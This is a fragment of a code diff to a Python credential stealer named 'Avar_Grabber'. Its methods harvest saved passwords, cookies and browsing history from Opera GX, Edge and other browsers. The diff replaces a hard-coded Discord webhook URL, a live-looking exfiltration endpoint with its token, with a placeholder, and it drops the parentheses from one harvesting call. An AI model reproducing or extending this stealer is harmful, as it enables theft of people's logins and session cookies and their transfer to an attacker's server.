@@ -14,7 +14,7 @@ from Crypto.Cipher import AES
 
 class Avar_Grabber:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/912478582390005780/fwXtl9MtJUPMxCp2abQS1agvZ06NNFqVUIYhNAvauRdqjM_YqFVaan-kWIFAh8a4Embz"
+        self.webhook = "WEBHOOK HERE"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -71,7 +71,7 @@ class Avar_Grabber:
         self.operagxpsw()
         self.operagxcookies()
         self.operagxhist()
-        self.edgecookies()
+        self.edgecookies
         self.edgehist()
         self.edgepsw()
         self.grabhist()
